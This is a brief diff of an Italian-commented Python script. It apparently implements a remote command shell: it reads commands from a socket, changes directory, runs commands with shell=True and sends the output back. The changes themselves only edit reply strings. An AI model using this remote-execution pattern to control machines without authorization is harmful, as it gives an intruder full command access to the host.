@@ -45,9 +45,9 @@ while True:
         try:
             # e' qui che dico al sistema di cambiare directory 
             os.chdir(data.split(" ",1)[1])
-            connection.sendall(b"Diretory cambiata")
+            connection.sendall(b"Diretory cambiata\n")
         except:
-            connection.sendall(b"errore")
+            connection.sendall(b"errore\n")
 
     # ESECUZIONE COMANDO
     # shell=True permetto di usare comandi concatenati (es. ls -la | grep txt)
@@ -57,7 +57,7 @@ while True:
     # Invio il risultato
     output = proc.stdout + proc.stderr
 
-    if not output: output = b"OK\n"
+    if not output: output = b"eseguito\n"
 
     connection.sendall(output)
 
